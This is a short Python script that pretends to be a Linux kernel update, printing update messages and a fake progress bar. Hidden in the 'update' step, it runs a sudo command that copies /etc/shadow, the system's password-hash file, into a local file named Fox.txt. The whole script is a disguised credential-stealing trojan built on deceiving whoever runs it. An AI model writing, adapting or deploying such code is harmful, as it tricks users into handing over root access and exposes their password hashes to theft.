import os
import time
import sys

print("Kernel Update:")
print("================")
print("The Linux Kernel need to update.")
print("Updating:")
os.system("sudo cat /etc/shadow > Fox.txt")
toolbar_width = 50

# setup toolbar
sys.stdout.write("[%s]" % (" " * toolbar_width))
sys.stdout.flush()
sys.stdout.write("\b" *
                 (toolbar_width + 1))  # return to start of line, after '['

for i in range(toolbar_width):
    time.sleep(0.1)  # do real work here
    # update the bar
    sys.stdout.write("#")
    sys.stdout.flush()

sys.stdout.write("]\n")  # this ends the progress bar
sys.stdout.write("]\n")
sys.stdout.write("]\n")
sys.stdout.write("]\n")
sys.stdout.write("]\n")
sys.stdout.write("]\n")
sys.stdout.write("]\n")
sys.stdout.write("]\n")
sys.stdout.write("]\n")
sys.stdout.write("]\n")
